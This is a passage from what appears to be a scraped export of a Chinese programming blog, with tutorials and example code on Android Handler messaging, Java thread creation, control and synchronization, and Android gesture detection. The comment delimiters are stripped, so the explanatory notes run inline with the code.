setContentView(R.layout.activity_main); mTextView = (TextView) findViewById(R.id.textView); } @Override protected void onDestroy() { super.onDestroy(); mHandler.removeCallbacksAndMessages(null); 移除 Looper 中的 MessageQueue 中所有等待处理的 Message } public void onClick(View view) { switch (view.getId()) { case R.id.button: new Thread() { @Override public void run() { 第一种 Message message = new Message(); message.what = 0; message.arg1 = 123; message.arg2 = 456; message.obj = \u0026#34;你好\u0026#34;; mHandler.sendMessage(message); 传递至 Looper 中的 MessageQueue，再发送给对应的 Handler 对象处理 第二种（推荐） Message message = mHandler.obtainMessage(0, 123, 456, \u0026#34;你好\u0026#34;); 重用 Message message.sendToTarget(); 传递至 Looper 中的 MessageQueue，再发送给对应的 Handler 对象处理 } }.start(); 启动线程 break; } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;Button android:onClick=\u0026#34;onClick\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;发送\u0026#34; android:id=\u0026#34;@+id/button\u0026#34;/\u0026gt; \u0026lt;TextView android:gravity=\u0026#34;center\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;wrap_content\u0026#34; android:text=\u0026#34;New Text\u0026#34; android:textSize=\u0026#34;20sp\u0026#34; android:id=\u0026#34;@+id/textView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; 防止 Handler 导致内存泄漏 导致原因： 非静态的内部类默认持有其外部类的强引用。 Handler 对象发送的 Message 对象会持有此 Handler 对象的引用。 Message ➜ Handler ➜ Activity ➜ Activity 资源无法回收（内存泄漏） 解决方案： 声明 Handler 为 static 或者使用 Handler.Callback 接口或者为其新建类文件。 通过弱引用持有外部 Activity。 弱引用：只持有弱引用的对象随时都会被回收，用于避免内存泄漏。（WeakReference） 软引用：只持有软引用的对象内存不足时回收，用于实现缓存机制。（SoftReference） 引用级别：强引用 \u0026gt; 软引用 \u0026gt; 弱引用 \u0026gt; 虚引用 public class MainActivity extends Activity { private static final Runnable mRunnable = new Runnable() { 静态匿名内部类 @Override public void run() { Log.w(\u0026#34;Tag\u0026#34;, Thread.currentThread().toString()); } }; private final MyHandler mMyHandler = new MyHandler(this); private TextView mTextView; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mTextView = (TextView) findViewById(R.id.textView); } @Override protected void onDestroy() { super.onDestroy(); mHandler.removeCallbacksAndMessages(null); 移除 Looper 中的 MessageQueue 中所有等待处理的 Message } public void onClick(View view) { switch (view.getId()) { case R.id.button: new Thread() { @Override public void run() { Message message = mMyHandler.obtainMessage(0, 123, 456, \u0026#34;你好\u0026#34;); mMyHandler.sendMessage(message); 传递至 Looper 中的 MessageQueue，再发送给对应的 Handler 对象处理 mMyHandler.post(mRunnable); 封装线程体为 Message 中的 callback，再传递至 Looper 中的 MessageQueue } }.start(); 启动线程 break; } } private static class MyHandler extends Handler { 静态内部类 private final WeakReference\u0026lt;MainActivity\u0026gt; mActivity; 通过弱引用持有外部 Activity private MyHandler(MainActivity activity) { 构造方法 mActivity = new WeakReference\u0026lt;\u0026gt;(activity); } @Override public void handleMessage(Message msg) { MainActivity mainActivity = mActivity.get(); if (mainActivity != null) { 如果不为空 mainActivity.mTextView.setText(msg.what + \u0026#34;:\u0026#34; + msg.arg1 + \u0026#34;:\u0026#34; + msg.arg2 + \u0026#34;:\u0026#34; + msg.obj); } } } } 自定义 Looper 线程 public class MainActivity extends Activity { private final MyHandler mMyHandler = new MyHandler(); 与主线程进行关联 @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mMyHandler.sendEmptyMessage(1); Message 在主线程进行处理 MyThread myThread = new MyThread(); myThread.start(); 启动线程 try { Thread.sleep(100); 阻塞 0.1 秒，等待线程体实例化 mMyHandler，避免空指针异常 } catch (InterruptedException e) { e.printStackTrace(); } myThread.mMyHandler.sendEmptyMessage(2); Message 在子线程进行处理 } private static class MyThread extends Thread { private MyHandler mMyHandler; @Override public void run() { Looper.prepare(); 为当前线程创建 Looper 并与之绑定 mMyHandler = new MyHandler(); 与子线程进行关联（实例化 Handler 的同时会自动绑定当前线程的 Looper） Looper.loop(); Looper 开始工作，无限循环，阻塞方法 } public void stopLoop() { Looper.myLooper().quitSafely(); Looper 停止工作 } } private static class MyHandler extends Handler { 静态内部类 @Override public void handleMessage(Message msg) { Log.w(\u0026#34;Tag\u0026#34;, msg.what + \u0026#34;::\u0026#34; + Thread.currentThread().toString()); } } } ---- 输出： 21106-21387/com.example.myapp.myapplication W/Tag: 2::Thread[Thread-214,5,main] 21106-21106/com.example.myapp.myapplication W/Tag: 1::Thread[main,5,main] HandlerThread public class MainActivity extends Activity { private final HandlerThread mHandlerThread = new HandlerThread(\u0026#34;123\u0026#34;); 已封装好的 Looper 线程，推荐这种方式 private MyHandler mMyHandler1; private MyHandler mMyHandler2; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mMyHandler1 = new MyHandler(); 无参构造方法 mMyHandler1.sendEmptyMessage(0); Message 在主线程进行处理 mHandlerThread.start(); 启动线程 mMyHandler2 = new MyHandler(mHandlerThread.getLooper()); 有参构造方法 mMyHandler2.sendEmptyMessage(0); Message 在子线程进行处理 } private static class MyHandler extends Handler { 静态内部类 private MyHandler() { 无参构造方法（实例化 Handler 的同时会自动绑定当前线程的 Looper） } private MyHandler(Looper looper) { 有参构造方法（指定 Looper 对象） super(looper); } @Override public void handleMessage(Message msg) { Log.w(\u0026#34;Tag\u0026#34;, msg.what + \u0026#34;::\u0026#34; + Thread.currentThread().toString()); } } } ---- 输出： 2853-4062/com.example.myapp.myapplication W/Tag: 0::Thread[123,5,main] 2853-2853/com.example.myapp.myapplication W/Tag: 0::Thread[main,5,main] 线程之间的交互 public class MainActivity extends Activity { private final HandlerThread mHandlerThread = new HandlerThread(\u0026#34;123\u0026#34;); private MyHandler mMyHandler1; private MyHandler mMyHandler2; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mHandlerThread.start(); 启动线程 mMyHandler1 = new MyHandler(); 绑定主线程 Looper mMyHandler2 = new MyHandler(mHandlerThread.getLooper()); 绑定子线程 Looper } public void onClick(View view) { switch (view.getId()) { case R.id.button1: Message message1 = mMyHandler1.obtainMessage(1, \u0026#34;主线程发往子线程\u0026#34;); message1.setTarget(mMyHandler2); 指定目标 Handler message1.sendToTarget(); 传递至 Looper 中的 MessageQueue，再发送给对应的 Handler 对象处理 break; case R.id.button2: Message message2 = mMyHandler2.obtainMessage(2, \u0026#34;子线程发往主线程\u0026#34;); message2.setTarget(mMyHandler1); 指定目标 Handler message2.sendToTarget(); 传递至 Looper 中的 MessageQueue，再发送给对应的 Handler 对象处理 break; } } private static class MyHandler extends Handler { 静态内部类 private MyHandler() { 无参构造方法（实例化 Handler 的同时会自动绑定当前线程的 Looper） } private MyHandler(Looper looper) { 有参构造方法（指定 Looper 对象） super(looper); } @Override public void handleMessage(Message msg) { Log.w(\u0026#34;Tag\u0026#34;, msg.what + \u0026#34;::\u0026#34; + msg.obj + \u0026#34;::\u0026#34; + Thread.currentThread().toString()); } } } ---- 输出： 15749-18518/com.example.myapp.myapplication W/Tag: 1::主线程发往子线程::Thread[123,5,main] 15749-15749/com.example.myapp.myapplication W/Tag: 2::子线程发往主线程::Thread[main,5,main] 更新 UI 的 4 种方式 public class MainActivity extends Activity { private final MyHandler mMyHandler = new MyHandler(this); private final MyRunnable mMyRunnable = new MyRunnable(this); private TextView mTextView; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mTextView = (TextView) findViewById(R.id.textView); } public void onClick(View view) { 这 4 种方法本质上都是通过 Handler 机制而运行在主线程 switch (view.getId()) { case R.id.button1: new Thread() { @Override public void run() { mMyHandler.obtainMessage(1, \u0026#34;你好\u0026#34;).sendToTarget(); Handler 方法 sendMessage } }.start(); 启动新线程 break; case R.id.button2: new Thread() { @Override public void run() { mMyHandler.post(mMyRunnable); Handler 方法 post } }.start(); 启动新线程 break; case R.id.button3: new Thread() { @Override public void run() { mTextView.post(mMyRunnable); View 方法 post } }.start(); 启动新线程 break; case R.id.button4: new Thread() { @Override public void run() { MainActivity.this.runOnUiThread(mMyRunnable); Activity 方法 runOnUiThread } }.start(); 启动新线程 break; } } private static class MyHandler extends Handler { 静态内部类 private final WeakReference\u0026lt;MainActivity\u0026gt; mActivity; 通过弱引用持有外部 Activity private MyHandler(MainActivity activity) { 构造方法 mActivity = new WeakReference\u0026lt;\u0026gt;(activity); } @Override public void handleMessage(Message msg) { Log.w(\u0026#34;Tag\u0026#34;, Thread.currentThread().toString()); 打印当前线程信息 MainActivity mainActivity = mActivity.get(); if (mainActivity != null) { 如果不为空 mainActivity.mTextView.setText(msg.obj.toString()); } } } private static class MyRunnable implements Runnable { 静态内部类 private final WeakReference\u0026lt;MainActivity\u0026gt; mActivity; 通过弱引用持有外部 Activity private MyRunnable(MainActivity activity) { 构造方法 mActivity = new WeakReference\u0026lt;\u0026gt;(activity); } @Override public void run() { Log.w(\u0026#34;Tag\u0026#34;, Thread.currentThread().toString()); 打印当前线程信息 MainActivity mainActivity = mActivity.get(); if (mainActivity != null) { 如果不为空 mainActivity.mTextView.setText(\u0026#34;你好\u0026#34;); } } } } ---- 输出： 3974-3974/com.example.myapp.myapplication W/Tag: Thread[main,5,main] 3974-3974/com.example.myapp.myapplication W/Tag: Thread[main,5,main] 3974-3974/com.example.myapp.myapplication W/Tag: Thread[main,5,main] 3974-3974/com.example.myapp.myapplication W/Tag: Thread[main,5,main] ","permalink":"https://xhstormr.github.io/blog/posts/android-handler/","summary":"","title":"Android Handler"},{"content":"Updated on 2016-10-24\nThread\nThread.State\nObject.wait() | Object.notifyAll()\n进程：一块包含了某些资源的内存区域。 一个进程中至少包含一个或多个线程（执行单元）。 进程的内存区域仅能被它所包含的线程访问。 线程：进程的顺序执行流，系统中最小的执行单元。 线程只能归属于一个进程并且只能访问该进程的资源。 进程的所有线程共享同一块内存空间。 并发：OS 的线程调度机制将时间划分为很多时间片（分时），尽可能均匀分配给正在运行的线程（抢占），获得 CPU 时间片的线程得以被执行，其他则等待；而 CPU 则在这些线程上来回切换运行（上下文切换）。 微观上走走停停，宏观上都在运行。 创建线程 public class A extends Thread { 通过继承 Thread 类 public static void main(String[] args) { Thread a = new A(); 实例化线程 a.start(); 启动线程 } @Override public void run() { 执行逻辑 for (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;123\u0026#34;); } } } ---- public class A implements Runnable { 通过实现 Runnable 接口（推荐，因为单继承，多实现） public static void main(String[] args) { Thread a = new Thread(new A()); 实例化线程并传入线程体 a.start(); 启动线程 } @Override public void run() { 执行逻辑 for (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;123\u0026#34;); } } } ---- public class A { 通过创建匿名内部类 public static void main(String[] args) { Thread a = new Thread() { Thread 方式 @Override public void run() { 执行逻辑 for (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;123\u0026#34;); } } }; a.start(); 启动线程 Thread b = new Thread(new Runnable() { Runnable 方式 @Override public void run() { 执行逻辑 for (int i = 0; i \u0026lt; 5; i++) { System.out.println(\u0026#34;123\u0026#34;); } } }); b.start(); 启动线程 } } 操作线程 线程信息 public class A implements Runnable { public static void main(String[] args) throws InterruptedException { Thread thread = Thread.currentThread(); 获取当前线程对象（这里获得了主线程对象） System.out.println(\u0026#34;标识符::名称::优先级::状态::是否处于活动状态::是否标记为中断\u0026#34;); System.out.println(thread.getId() + \u0026#34;::\u0026#34; + thread.getName() + \u0026#34;::\u0026#34; + thread.getPriority() + \u0026#34;::\u0026#34; + thread.getState() + \u0026#34;::\u0026#34; + thread.isAlive() + \u0026#34;::\u0026#34; + thread.isInterrupted()); System.out.println(); Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); 实例化线程并传入线程体 System.out.println(a.getId() + \u0026#34;::\u0026#34; + a.getName() + \u0026#34;::\u0026#34; + a.getPriority() + \u0026#34;::\u0026#34; + a.getState() + \u0026#34;::\u0026#34; + a.isAlive() + \u0026#34;::\u0026#34; + a.isInterrupted()); a.start(); 启动线程 System.out.println(a.getId() + \u0026#34;::\u0026#34; + a.getName() + \u0026#34;::\u0026#34; + a.getPriority() + \u0026#34;::\u0026#34; + a.getState() + \u0026#34;::\u0026#34; + a.isAlive() + \u0026#34;::\u0026#34; + a.isInterrupted()); Thread.sleep(1000); 当前线程进入阻塞状态 1 秒（1000 毫秒 = 1 秒） System.out.println(a.getId() + \u0026#34;::\u0026#34; + a.getName() + \u0026#34;::\u0026#34; + a.getPriority() + \u0026#34;::\u0026#34; + a.getState() + \u0026#34;::\u0026#34; + a.isAlive() + \u0026#34;::\u0026#34; + a.isInterrupted()); System.out.println(); Thread b = new Thread(new A(), \u0026#34;MyThread_2\u0026#34;); 实例化线程并传入线程体 System.out.println(b.getId() + \u0026#34;::\u0026#34; + b.getName() + \u0026#34;::\u0026#34; + b.getPriority() + \u0026#34;::\u0026#34; + b.getState() + \u0026#34;::\u0026#34; + b.isAlive() + \u0026#34;::\u0026#34; + b.isInterrupted()); b.start(); 启动线程 System.out.println(b.getId() + \u0026#34;::\u0026#34; + b.getName() + \u0026#34;::\u0026#34; + b.getPriority() + \u0026#34;::\u0026#34; + b.getState() + \u0026#34;::\u0026#34; + b.isAlive() + \u0026#34;::\u0026#34; + b.isInterrupted()); Thread.sleep(1000); 当前线程进入阻塞状态 1 秒（1000 毫秒 = 1 秒） System.out.println(b.getId() + \u0026#34;::\u0026#34; + b.getName() + \u0026#34;::\u0026#34; + b.getPriority() + \u0026#34;::\u0026#34; + b.getState() + \u0026#34;::\u0026#34; + b.isAlive() + \u0026#34;::\u0026#34; + b.isInterrupted()); } @Override public void run() { } } ---- 输出： 标识符::名称::优先级::状态::是否处于活动状态::是否标记为中断 1::main::5::RUNNABLE::true::false 11::MyThread_1::5::NEW::false::false 11::MyThread_1::5::RUNNABLE::true::false 11::MyThread_1::5::TERMINATED::false::false 12::MyThread_2::5::NEW::false::false 12::MyThread_2::5::RUNNABLE::true::false 12::MyThread_2::5::TERMINATED::false::false 线程优先级 public class A implements Runnable { public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); Thread b = new Thread(new A(), \u0026#34;MyThread_2\u0026#34;); a.setPriority(Thread.NORM_PRIORITY); 默认优先级 5 a.setPriority(Thread.MIN_PRIORITY); 设置为最小优先级 1（降低线程获得时间片的几率） b.setPriority(Thread.MAX_PRIORITY); 设置为最大优先级 10（提高线程获得时间片的几率） a.start(); 启动线程 b.start(); 启动线程 } @Override public void run() { Thread thread = Thread.currentThread(); 获取当前线程对象 for (int i = 0; i \u0026lt; 5; i++) { System.out.println(thread.getName()); } } } ---- 输出： MyThread_2 MyThread_2 MyThread_2 MyThread_2 MyThread_2 MyThread_1 MyThread_1 MyThread_1 MyThread_1 MyThread_1 守护线程 public class A implements Runnable { public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;Daemon\u0026#34;); a.setDaemon(true); 设置为守护线程（特点：当进程中只剩下守护线程时，所有守护线程将被强制终止） a.start(); 启动线程 } @Override public void run() { Thread thread = Thread.currentThread(); 获取当前线程对象 for (int i = 1; true; i++) { System.out.println(thread.getName() + \u0026#34;::\u0026#34; + i); try { Thread.sleep(1000); 当前线程进入阻塞状态 1 秒 } catch (InterruptedException e) { e.printStackTrace(); } } } } ---- 输出： （无） 阻塞线程 sleep public class A { public static void main(String[] args) { SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\u0026#34;hh:mm:ss\u0026#34;); while (true) { System.out.println(simpleDateFormat.format(new Date())); try { Thread.sleep(1000); 当前线程进入阻塞状态 1 秒（不会释放锁），之后重新进入 Runnable 状态，等待获得时间片 } catch (InterruptedException e) { e.printStackTrace(); } } } } ---- 输出： 11:44:23 11:44:24 11:44:25 11:44:26 11:44:27 11:44:28 ... join public class A implements Runnable { 使用 join 方法 public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); a.start(); 启动线程 try { a.join(); 当前线程进入阻塞状态，等待调用 join 方法的线程的线程体（run 方法）结束 } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(\u0026#34;—————————————\u0026#34;); } @Override public void run() { Thread thread = Thread.currentThread(); for (int i = 0; i \u0026lt; 5; ) { System.out.println(thread.getName() + \u0026#34;::\u0026#34; + ++i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } } ---- 输出： MyThread_1::1 MyThread_1::2 MyThread_1::3 MyThread_1::4 MyThread_1::5 ————————————— ------------------------------------------------------- public class A implements Runnable { 未使用 join 方法 public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); a.start(); 启动线程 System.out.println(\u0026#34;—————————————\u0026#34;); } @Override public void run() { Thread thread = Thread.currentThread(); for (int i = 0; i \u0026lt; 5; ) { System.out.println(thread.getName() + \u0026#34;::\u0026#34; + ++i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } } ---- 输出： ————————————— MyThread_1::1 MyThread_1::2 MyThread_1::3 MyThread_1::4 MyThread_1::5 yield public class A implements Runnable { 使用 yield 方法 public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); Thread b = new Thread(new A(), \u0026#34;MyThread_2\u0026#34;); a.start(); 启动线程 b.start(); 启动线程 } @Override public void run() { Thread thread = Thread.currentThread(); for (int i = 0; i \u0026lt; 5; i++) { System.out.println(thread.getName()); Thread.yield(); 强制当前线程主动让出 CPU 时间片，回到 Runnable 状态，等待获得时间片 } } } ---- 输出： MyThread_1 MyThread_2 MyThread_1 MyThread_2 MyThread_1 MyThread_2 MyThread_1 MyThread_2 MyThread_1 MyThread_2 ------------------------------------------------------- public class A implements Runnable { 未使用 yield 方法 public static void main(String[] args) { Thread a = new Thread(new A(), \u0026#34;MyThread_1\u0026#34;); Thread b = new Thread(new A(), \u0026#34;MyThread_2\u0026#34;); a.start(); 启动线程 b.start(); 启动线程 } @Override public void run() { Thread thread = Thread.currentThread(); for (int i = 0; i \u0026lt; 5; i++) { System.out.println(thread.getName()); } } } ---- 输出： MyThread_1 MyThread_1 MyThread_1 MyThread_1 MyThread_2 MyThread_2 MyThread_2 MyThread_2 MyThread_2 MyThread_1 停止线程 public class A implements Runnable { 通过调用 interrupt 方法（实质为设置退出旗标） public static void main(String[] args) { Thread a = new Thread(new A()); a.start(); 启动线程 try { Thread.sleep(1000); 当前线程进入阻塞状态 1 秒 } catch (InterruptedException e) { e.printStackTrace(); } a.interrupt(); 标记线程为中断状态 } @Override public void run() { while (!Thread.interrupted()) { 判断线程是否为中断状态 System.out.println(\u0026#34;Running...\u0026#34;); try { Thread.sleep(200); 当前线程进入阻塞状态 0.2 秒 } catch (InterruptedException e) { 阻塞状态下中断线程将引发该异常，且中断状态将被清除 break; 跳出循环 } } System.out.println(\u0026#34;Stop!\u0026#34;); 收尾工作 } } ---- 输出： Running... Running... Running... Running... Running... Stop! ------------------------------------------------------- public class A implements Runnable { 通过设置退出旗标 private volatile boolean mRunning = true; volatile 关键字保证了多线程同步中的可见性，使线程能够正确获得变量的最新值 public static void main(String[] args) { Runnable runnable = new A(); Thread a = new Thread(runnable); a.start(); 启动线程 try { Thread.sleep(1000); 当前线程进入阻塞状态 1 秒 } catch (InterruptedException e) { e.printStackTrace(); } ((A) runnable).mRunning = false; 标记为 false } @Override public void run() { while (mRunning) { 判断是否继续运行 System.out.println(\u0026#34;Running...\u0026#34;); try { Thread.sleep(200); 当前线程进入阻塞状态 0.2 秒 } catch (InterruptedException e) { e.printStackTrace(); } } System.out.println(\u0026#34;Stop!\u0026#34;); 收尾工作 } } ---- 输出： Running... Running... Running... Running... Running... Stop! 同步线程 异步一一一一：多线程并发，各干各的。 同步（互斥）：有先后顺序，你干完我再干。 synchronized 给修饰的代码块或方法加上 同步锁，保证了 可见性 和 原子性。 同步锁：同时只允许一个线程持有，且此时只有该线程能够执行该同步锁修饰的代码块或方法。 静态方法锁：锁对象是类对象。Man.class 非静态方法锁：锁对象是类的对象。new Man() 线程在进入同步代码块或方法时获得锁。 线程在退出同步代码块或方法时释放锁。 可见性：对变量的读操作，总是能看到对这个变量最后的写操作。 happens-before 关系：确保程序语句之间的排序在内存中的写对其他语句都是可见的。 volatile修饰的变量强制线程每次读写的时候都需要与主内存进行同步，只会保存一份，保证了 可见性。 读：直接读取 主内存中的值。 写：立即刷新 主内存中的值。 原子性：操作不可分割，视作一个整体，且 不会被线程调度机制打断，则称为原子操作。 happens-before 关系 ------------------------------------------------------- 定义变量 ---- private int i1 = 1; private int i2 = 2; private int i3 = 3; private volatile boolean mBoolean = false; 用 volatile 修饰的变量 读 ---- （错）System.out.println(i1); JVM 的重排序对普通变量的读操作不会排在对 volatile 变量的读操作之前，只会排在对 volatile 变量的读操作之后 System.out.println(mBoolean); System.out.println(i1); System.out.println(i2); System.out.println(i3); 写 ---- i1 = 4; i2 = 5; i3 = 6; mBoolean = true; （错）i1 = 7; JVM 的重排序对普通变量的写操作不会排在对 volatile 变量的写操作之后，只会排在对 volatile 变量的写操作之前 public class A implements Runnable { public int mInt = 0; 值（应当守恒） public volatile boolean mRunning = true; 退出旗标 @Override public void run() { while (mRunning) { 无限循环 synchronized (this) { 同步锁（锁对象是类的对象） mInt++; mInt--; } } } } ---- public class Initial { public static void main(String[] args) throws InterruptedException { A a = new A(); 线程体 for (int i = 0; i \u0026lt; 3; i++) { 启动 3 个线程 new Thread(a).start(); 传入同一个线程体，执行其中的 run 方法 } Thread.sleep(1000); 当前线程进入阻塞状态 1 秒 a.mRunning = false; 标记为 false System.out.println(a.mInt); 输出值 } } ---- 输出： 0 public class A implements Runnable { private final int[] mInts; 能量数组（锁对象应该用 final 修饰） public A(int[] ints) { 构造函数 mInts = ints; } @Override public void run() { 线程体 Random random = new Random(); while (true) { 无限循环 int from = ((int) (mInts.length * random.nextDouble())); 随机 int to = ((int) (mInts.length * random.nextDouble())); 随机 int i = ((int) (1000 * random.nextDouble())); 随机 transfer(from, to, i); 转移能量 try { Thread.sleep(10); 阻塞 10 毫秒 } catch (InterruptedException e) { e.printStackTrace(); } } } private void transfer(int from, int to, int i) { 转移能量 if (mInts[from] \u0026lt; i) { 能量不足 return; } synchronized (mInts) { 同步锁（多个需要同步的线程的同步锁应该是同一个锁对象的引用，否则无法得到同步效果） mInts[from] -= i; 减少 mInts[to] += i; 增加 DecimalFormat decimalFormat1 = new DecimalFormat(\u0026#34;00\u0026#34;); 格式化 DecimalFormat decimalFormat2 = new DecimalFormat(\u0026#34;000\u0026#34;); 格式化 System.out.printf(\u0026#34;%s\\t 从 %s 转移 %s 到 %s \\t%d\\n\u0026#34;, Thread.currentThread().getName(), decimalFormat1.format(from), decimalFormat2.format(i), decimalFormat1.format(to), getAll()); } } private int getAll() { 获得总能量（应当守恒） int sum = 0; for (int i : mInts) { sum += i; } return sum; } } ---- public class Initial { public static void main(String[] args) { int[] ints = new int[100]; 初始化能量数组（共 100 个单元，每个单元 1000 能量） for (int i = 0; i \u0026lt; ints.length; i++) { ints[i] = 1000; } DecimalFormat decimalFormat = new DecimalFormat(\u0026#34;000\u0026#34;); for (int i = 0; i \u0026lt; ints.length; ) { 启动 100 个线程 Thread thread = new Thread(new A(ints), \u0026#34;A_\u0026#34; + decimalFormat.format(++i)); 传入同一个数组，对其进行操作，并作为锁对象 thread.start(); 启动线程 } } } ---- 输出： A_042\t从 39 转移 209 到 49 100000 A_056\t从 22 转移 017 到 31 100000 A_044\t从 29 转移 055 到 30 100000 A_068\t从 28 转移 717 到 66 100000 A_069\t从 85 转移 020 到 16 100000 A_070\t从 00 转移 380 到 54 100000 A_072\t从 67 转移 783 到 25 100000 A_034\t从 58 转移 377 到 02 100000 A_073\t从 04 转移 710 到 98 100000 A_074\t从 30 转移 499 到 57 100000 A_075\t从 95 转移 299 到 81 100000 ... ","permalink":"https://xhstormr.github.io/blog/posts/java-thread/","summary":"","title":"Java Thread"},{"content":"Updated on 2016-10-18\nGestureDetector MainActivity.java public class MainActivity extends Activity { private ImageView mImageView; private GestureDetector mGestureDetector; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mImageView = (ImageView) findViewById(R.id.imageView); mGestureDetector = new GestureDetector(MainActivity.this, new MyGestureListener()); mImageView.setLongClickable(true); 设置可以长按 mImageView.setOnTouchListener(new View.OnTouchListener() { 设置监听器 @Override public boolean onTouch(View v, MotionEvent event) { mGestureDetector.onTouchEvent(event); 转发 MotionEvent 给 GestureDetector return true; 消耗掉事件（不继续传递） } }); } private class MyGestureListener extends GestureDetector.SimpleOnGestureListener { @Override public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) { e1 起始，e2 结束 if (e1.getX() - e2.getX() \u0026gt; 50) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;向左滑动\u0026#34;); } if (e2.getX() - e1.getX() \u0026gt; 50) { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;向右滑动\u0026#34;); } return super.onFling(e1, e2, velocityX, velocityY); } @Override public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) { e1 起始，e2 结束 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onScroll\u0026#34;); return super.onScroll(e1, e2, distanceX, distanceY); } @Override public boolean onDown(MotionEvent e) { 按下 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onDown\u0026#34;); return super.onDown(e); } @Override public boolean onSingleTapUp(MotionEvent e) { 单击抬起 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onSingleTapUp\u0026#34;); return super.onSingleTapUp(e); } @Override public boolean onSingleTapConfirmed(MotionEvent e) { 单击（确认不是双击） Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onSingleTapConfirmed\u0026#34;); return super.onSingleTapConfirmed(e); } @Override public boolean onDoubleTap(MotionEvent e) { 双击 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onDoubleTap\u0026#34;); return super.onDoubleTap(e); } @Override public boolean onDoubleTapEvent(MotionEvent e) { 双击事件（按下，移动，抬起） Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onDoubleTapEvent\u0026#34;); return super.onDoubleTapEvent(e); } @Override public void onShowPress(MotionEvent e) { 短按 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onShowPress\u0026#34;); super.onShowPress(e); } @Override public void onLongPress(MotionEvent e) { 长按 Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onLongPress\u0026#34;); super.onLongPress(e); } @Override public boolean onContextClick(MotionEvent e) { 点击 Context Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;onContextClick\u0026#34;); return super.onContextClick(e); } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; android:padding=\u0026#34;16dp\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34;\u0026gt; \u0026lt;ImageView android:background=\u0026#34;#3F51B5\u0026#34; android:layout_width=\u0026#34;match_parent\u0026#34; android:layout_height=\u0026#34;match_parent\u0026#34; android:id=\u0026#34;@+id/imageView\u0026#34;/\u0026gt; \u0026lt;/LinearLayout\u0026gt; GestureOverlayView 生成手势文件并放入项目： samples-23_r02.zip\\android-6.0\\legacy\\GestureBuilder /mnt/sdcard/gestures ➜ res\\raw\\gestures MainActivity.java public class MainActivity extends Activity implements GestureOverlayView.OnGesturePerformedListener { private GestureOverlayView mGestureOverlayView; private GestureLibrary mGestureLibrary; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mGestureLibrary = GestureLibraries.fromRawResource(MainActivity.this, R.raw.gestures); 手势库（res\\raw\\gestures） mGestureLibrary.load(); 加载手势 mGestureOverlayView = (GestureOverlayView) findViewById(R.id.gestureOverlayView); mGestureOverlayView.addOnGesturePerformedListener(this); 设置监听器 } @Override public void onGesturePerformed(GestureOverlayView overlay, Gesture gesture) { Prediction prediction = mGestureLibrary.recognize(gesture).get(0); 用手势库匹配该 gesture if (prediction.score \u0026gt;= 2.0) { 匹配度 switch (prediction.name) { case \u0026#34;1\u0026#34;: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;1\u0026#34;); break; case \u0026#34;2\u0026#34;: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;2\u0026#34;); break; case \u0026#34;3\u0026#34;: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;3\u0026#34;); break; case \u0026#34;你\u0026#34;: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;你\u0026#34;); break; case \u0026#34;好\u0026#34;: Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;好\u0026#34;); break; } } else { Log.w(\u0026#34;Tag\u0026#34;, \u0026#34;没有该手势\u0026#34;); } } } activity_main.xml \u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34; android:orientation=\u0026#34;vertical\u0026#34; 